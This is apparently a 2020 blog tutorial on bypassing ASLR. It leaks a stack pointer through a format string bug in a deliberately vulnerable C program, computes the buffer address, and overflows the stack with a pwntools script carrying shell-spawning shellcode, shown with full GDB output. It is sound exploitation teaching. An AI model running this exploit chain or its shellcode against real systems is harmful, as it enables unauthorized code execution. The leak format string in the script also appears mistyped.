---
layout: post
title: "Defeating ASLR via Memory Leak"
date: 2020-12-29
---

Address Space Layout Randomization (ASLR) is a modern exploit mitigation technique that Operating Systems typically use to randomize addresses when a process is executed. This is implemented by having the OS change the locations of special areas, such as the base of executable, the heap, the stack, and any libraries that are loaded in memory. Since memory addresses are unpredictable when ASLR is turned on, hardcoded addresses can no longer be used in exploits when ASLR is enabled.

Sometimes, if there is a poor implementation of ASLR, the addresses may not be very random (ex. only a byte or two actually change when the program is executed). In other cases, one might try to exploit a partial overwrite, which means that there are only a few unknown bytes of the address. In both of these cases, it may be possible to brute force all the possible addresses in our exploit. However, brute forcing is infeasible if the address space is properly randomized, so this blog post is going to be focused on using a more reliable method of bypassing ASLR: leaking memory addresses.

One thing to note about ASLR is that it does not change offsets. That is, if during one instance of a process, there was a variable that was located at `0x00001000` and a second variable that was located at `0x00001010` in the same library, then the second variable will always be `0x10` bytes away from the first variable no matter what. If ASLR changes the first variable's location to `0x00001234` while executing the program again, then the second variable must be at `0x00001244` because it must remain `0x10` bytes away from the first variable.

Because offsets remain the same, if an attacker can leak just one address from the program, the attacker will be able to use that one address to calculate any other addresses in the same memory mapping by adding or subtracting some constant offset. An attacker could then write an exploit that leaks an address off of the stack (using something like a format string vulnerability), use the leaked address to figure out the address of some shellcode, and exploit a buffer overflow to overwrite the return address with the calculated address of the shellcode. Since the offset does not change, this exploit should work in all instances.

This is the C program that will be exploited:
```c
#include <stdio.h>
#include <stdlib.h>

// Compilation: gcc -o buffers -fno-stack-protector -z execstack buffers.c

int main(int argc, char **argv) {
    char buf1[100] = {0};
    char buf2[100] = {0};

    printf("Enter your input for the first buffer (fmt str vuln): ");
    fgets(buf1, 100, stdin);
    printf(buf1);

    printf("Enter your input for the second buffer (stack overflow): ");
    fgets(buf2, 300, stdin);

    return 0;
}
```

Assume that NX and stack canaries are disabled. The `printf(buf1)` call is clearly vulnerable to a format string exploit since the user controls what's in `buf1`. The `fgets(buf2, 300, stdin)` is vulnerable to a stack buffer overflow because it is trying to read 300 bytes of data into a 100 byte buffer. After doing some poking around, one can see that the return address is located 232 bytes into the second buffer.
```
$ python3 -c "print('A\n'+'A'*232+'BBBBBBBB')" > test                                                    130 ⨯
$ ./buffers < test
Enter your input for the first buffer (fmt str vuln): A
zsh: segmentation fault  ./buffers < test
```

As proof, here is what this looks like in GDB. Note that the return address on the stack has been overwritten with B's after 232 bytes have been written to the second buffer.
```
$ gdb buffers                                                                                            139 ⨯
GNU gdb (Debian 10.1-1.4) 10.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
76 commands loaded for GDB 10.1 using Python engine 3.9
[*] 4 commands could not be loaded, run `gef missing` to know why.
Reading symbols from buffers...
(No debugging symbols found in buffers)
gef➤  r < test
Starting program: /home/nihaal/Desktop/buffers < test
Enter your input for the first buffer (fmt str vuln): A

Program received signal SIGSEGV, Segmentation fault.
0x00005555555552bb in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x00005555555597a3  →  0x0000000000000000
$rdx   : 0x0
$rsp   : 0x00007fffffffe028  →  "BBBBBBBB\n"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00005555555596b2  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rdi   : 0x00007ffff7fb0680  →  0x0000000000000000
$rip   : 0x00005555555552bb  →  <main+374> ret
$r8    : 0x00007fffffffdf40  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$r9    : 0x0
$r10   : 0x0000555555556040  →  "Enter your input for the second buffer (stack over[...]"
$r11   : 0x246
$r12   : 0x0000555555555060  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe028│+0x0000: "BBBBBBBB\n"         ← $rsp
0x00007fffffffe030│+0x0008: 0x00007fffffff000a  →  0x0000000000000000
0x00007fffffffe038│+0x0010: 0x0000000100000000
0x00007fffffffe040│+0x0018: 0x0000555555555145  →  <main+0> push rbp
0x00007fffffffe048│+0x0020: 0x00007ffff7e157cf  →  <init_cacheinfo+287> mov rbp, rax
0x00007fffffffe050│+0x0028: 0x0000000000000000
0x00007fffffffe058│+0x0030: 0x852cdd6ab588b454
0x00007fffffffe060│+0x0038: 0x0000555555555060  →  <_start+0> xor ebp, ebp
──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555552b0 <main+363>       call   0x555555555040 <fgets@plt>
   0x5555555552b5 <main+368>       mov    eax, 0x0
   0x5555555552ba <main+373>       leave
 → 0x5555555552bb <main+374>       ret
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "buffers", stopped 0x5555555552bb in main (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555552bb → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  info frame
Stack level 0, frame at 0x7fffffffe028:
 rip = 0x5555555552bb in main; saved rip = 0x4242424242424242
 Arglist at 0x4141414141414141, args:
 Locals at 0x4141414141414141, Previous frame's sp is 0x7fffffffe030
 Saved registers:
  rip at 0x7fffffffe028
```

This is what the `main()` function looks like:
```
gef➤  disas main
Dump of assembler code for function main:
   0x0000555555555145 <+0>:     push   rbp
   0x0000555555555146 <+1>:     mov    rbp,rsp
   0x0000555555555149 <+4>:     sub    rsp,0xf0
   0x0000555555555150 <+11>:    mov    DWORD PTR [rbp-0xe4],edi
   0x0000555555555156 <+17>:    mov    QWORD PTR [rbp-0xf0],rsi
   0x000055555555515d <+24>:    mov    QWORD PTR [rbp-0x70],0x0
   0x0000555555555165 <+32>:    mov    QWORD PTR [rbp-0x68],0x0
   0x000055555555516d <+40>:    mov    QWORD PTR [rbp-0x60],0x0
   0x0000555555555175 <+48>:    mov    QWORD PTR [rbp-0x58],0x0
   0x000055555555517d <+56>:    mov    QWORD PTR [rbp-0x50],0x0
   0x0000555555555185 <+64>:    mov    QWORD PTR [rbp-0x48],0x0
   0x000055555555518d <+72>:    mov    QWORD PTR [rbp-0x40],0x0
   0x0000555555555195 <+80>:    mov    QWORD PTR [rbp-0x38],0x0
   0x000055555555519d <+88>:    mov    QWORD PTR [rbp-0x30],0x0
   0x00005555555551a5 <+96>:    mov    QWORD PTR [rbp-0x28],0x0
   0x00005555555551ad <+104>:   mov    QWORD PTR [rbp-0x20],0x0
   0x00005555555551b5 <+112>:   mov    QWORD PTR [rbp-0x18],0x0
   0x00005555555551bd <+120>:   mov    DWORD PTR [rbp-0x10],0x0
   0x00005555555551c4 <+127>:   mov    QWORD PTR [rbp-0xe0],0x0
   0x00005555555551cf <+138>:   mov    QWORD PTR [rbp-0xd8],0x0
   0x00005555555551da <+149>:   mov    QWORD PTR [rbp-0xd0],0x0
   0x00005555555551e5 <+160>:   mov    QWORD PTR [rbp-0xc8],0x0
   0x00005555555551f0 <+171>:   mov    QWORD PTR [rbp-0xc0],0x0
   0x00005555555551fb <+182>:   mov    QWORD PTR [rbp-0xb8],0x0
   0x0000555555555206 <+193>:   mov    QWORD PTR [rbp-0xb0],0x0
   0x0000555555555211 <+204>:   mov    QWORD PTR [rbp-0xa8],0x0
   0x000055555555521c <+215>:   mov    QWORD PTR [rbp-0xa0],0x0
   0x0000555555555227 <+226>:   mov    QWORD PTR [rbp-0x98],0x0
   0x0000555555555232 <+237>:   mov    QWORD PTR [rbp-0x90],0x0
   0x000055555555523d <+248>:   mov    QWORD PTR [rbp-0x88],0x0
   0x0000555555555248 <+259>:   mov    DWORD PTR [rbp-0x80],0x0
   0x000055555555524f <+266>:   lea    rdi,[rip+0xdb2]        # 0x555555556008
   0x0000555555555256 <+273>:   mov    eax,0x0
   0x000055555555525b <+278>:   call   0x555555555030 <printf@plt>
   0x0000555555555260 <+283>:   mov    rdx,QWORD PTR [rip+0x2dd9]        # 0x555555558040 <stdin@@GLIBC_2.2.5>
   0x0000555555555267 <+290>:   lea    rax,[rbp-0x70]
   0x000055555555526b <+294>:   mov    esi,0x64
   0x0000555555555270 <+299>:   mov    rdi,rax
   0x0000555555555273 <+302>:   call   0x555555555040 <fgets@plt>
   0x0000555555555278 <+307>:   lea    rax,[rbp-0x70]
   0x000055555555527c <+311>:   mov    rdi,rax
   0x000055555555527f <+314>:   mov    eax,0x0
   0x0000555555555284 <+319>:   call   0x555555555030 <printf@plt>
   0x0000555555555289 <+324>:   lea    rdi,[rip+0xdb0]        # 0x555555556040
   0x0000555555555290 <+331>:   mov    eax,0x0
   0x0000555555555295 <+336>:   call   0x555555555030 <printf@plt>
   0x000055555555529a <+341>:   mov    rdx,QWORD PTR [rip+0x2d9f]        # 0x555555558040 <stdin@@GLIBC_2.2.5>
   0x00005555555552a1 <+348>:   lea    rax,[rbp-0xe0]
   0x00005555555552a8 <+355>:   mov    esi,0x12c
   0x00005555555552ad <+360>:   mov    rdi,rax
   0x00005555555552b0 <+363>:   call   0x555555555040 <fgets@plt>
   0x00005555555552b5 <+368>:   mov    eax,0x0
   0x00005555555552ba <+373>:   leave
=> 0x00005555555552bb <+374>:   ret
```

Before writing the exploit, an attaker needs to look at the memory addresses that can be leaked off of the stack from the format string vulnerability and discover their offsets from the address that contains the shellcode. In this example, one can set a breakpoint at \*main+368 (right after the second call to `fgets()`), exploit the format string vulnerability to print out addresses off of the stack, and look at the addresses. The goal here is to find the start of the second buffer and a suitable address leaked off of the stack. Subtracting these two addresses will result in obtaining the offset that is required for the exploit.

```
gef➤  b *main+368
Breakpoint 2 at 0x12b5
gef➤  r
Starting program: /home/nihaal/Desktop/buffers
Enter your input for the first buffer (fmt str vuln): %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
0x5555555596b1.(nil).0x5555555596cf.0x7fffffffdfb0.0x7ffff7fadbe0.0x7fffffffe118.0x100000000.(nil).(nil).(nil).
Enter your input for the second buffer (stack overflow): AAAAAAAAAAAAAAAAAAAAAA

Breakpoint 2, 0x00005555555552b5 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdf40  →  "AAAAAAAAAAAAAAAAAAAAAA\n"
$rbx   : 0x0
$rcx   : 0x00005555555596c7  →  ".%p.%p.\n"
$rdx   : 0x0
$rsp   : 0x00007fffffffdf30  →  0x00007fffffffe118  →  0x00007fffffffe42f  →  "/home/nihaal/Desktop/buffers"
$rbp   : 0x00007fffffffe020  →  0x00005555555552c0  →  <__libc_csu_init+0> push r15
$rsi   : 0x00005555555596b1  →  "AAAAAAAAAAAAAAAAAAAAA\n.%p.%p.\n"
$rdi   : 0x00007ffff7fb0680  →  0x0000000000000000
$rip   : 0x00005555555552b5  →  <main+368> mov eax, 0x0
$r8    : 0x00007fffffffdf40  →  "AAAAAAAAAAAAAAAAAAAAAA\n"
$r9    : 0x0
$r10   : 0x0000555555556040  →  "Enter your input for the second buffer (stack over[...]"
$r11   : 0x246
$r12   : 0x0000555555555060  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
```

As one can see above, the fourth value printed out from the stack when exploiting the format string vulnerability is `0x7fffffffdfb0` in this instance of the process. The second buffer, which is currently in `rax`, starts at `0x00007fffffffdf40` in the same instance. This means that the fourth value printed out from the format string vulnerability is always going to have an offset of `0x7fffffffdfb0 - 0x00007fffffffdf40 = 112` bytes. In other words, subtracting 112 bytes from the fourth pointer on the stack will result in the address of the second buffer, which is where the shellcode will be injected.

Now that the offset is known, it is simple to write a program that exploits the buffer overflow using this calculated address. The only difference between this buffer overflow and a buffer overflow with ASLR turned off is that this buffer overflow does not use a hardcoded address. Instead, this exploit will calculate the address of the shellcode on the spot using the information that was leaked earlier.

```python
#!/usr/bin/env python3
from pwn import *

# Open up the process
p = process("./buffers", stdin=PTY)
p.recv() # Ignore the first part

# Leak the fourth pointer from the stack
p.sendline("%4%p") # This will directly print out the fourth pointer

# Calculate the address of the buffer that will contain the shellcode
# It should be 112 bytes away from the leaked address
addr =  p64(int(p.recvline().strip(), 16) - 112)

# Generate the shellcode
shellcode = b"\x48\x81\xec\x2c\x01\x00\x00\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05"
nops = b'\x90' * (232 - len(shellcode))
payload = nops + shellcode + addr

# Trigger the buffer overflow
p.sendline(payload)
p.interactive()
```

This exploit should work even when ASLR is turned on.

{% include related_posts.html %}
